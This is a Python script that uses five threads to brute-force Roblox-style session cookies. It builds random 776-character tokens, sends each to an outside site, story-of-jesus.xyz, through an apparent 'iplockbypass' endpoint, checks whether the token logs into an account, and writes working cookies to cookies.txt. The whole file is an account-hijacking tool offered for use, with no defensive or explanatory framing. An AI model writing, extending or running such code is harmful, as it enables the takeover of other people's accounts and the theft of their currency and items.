import requests, json, re
import random, string
import threading
from bs4 import BeautifulSoup


def process():
   while True:
      valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
      rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
      finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

      cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text
      r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
      data = r.json()

      if data["status"] == "failed":
         falsecookie = rancookie[:29]
         print("[INVALID] " + falsecookie + "...")

      else:
         falsecookie = rancookie[:9]
         print(f"[VALID]" + falsecookie + f" {data['username']} And Logged To File.")
         f = open("cookies.txt", "a")
         f.write(cookie + "\n")
         f.close()

t1 = threading.Thread(target=process)
t2 = threading.Thread(target=process)
t3 = threading.Thread(target=process)
t4 = threading.Thread(target=process)
t5 = threading.Thread(target=process)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
